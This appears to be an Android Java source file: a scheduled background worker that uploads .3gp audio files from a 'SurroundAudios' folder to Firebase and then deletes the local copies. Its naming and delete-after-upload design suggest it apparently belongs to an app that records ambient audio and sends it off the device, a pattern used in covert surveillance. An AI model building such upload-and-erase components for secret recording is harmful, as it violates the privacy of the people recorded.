package com.sai.intelligent.services;


import android.content.Context;
import android.media.MediaRecorder;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.sai.intelligent.utils.FirebaseUtils;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class ScheduleRecorderService extends Worker {


    private static final String TAG = "SchedulerRecorder";

    public ScheduleRecorderService(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    private void uploadFiles() {

        File file = new File(getApplicationContext().getFilesDir().getPath(),"SurroundAudios");
        search(".*\\.3gp",file);

    }

    public static void search(final String pattern, final File folder) {
        for (final File f : folder.listFiles()) {

            if (f.isDirectory()) {
                search(pattern, f);
            }

            if (f.isFile()) {
                if (f.getName().matches(pattern)) {
                    FirebaseUtils.uploadFile("SurroundRecorder",f.getPath());
                    f.delete();
                }
            }

        }
    }

    @NonNull
    @Override
    public Result doWork() {
        uploadFiles();
        return Result.success();
    }

}
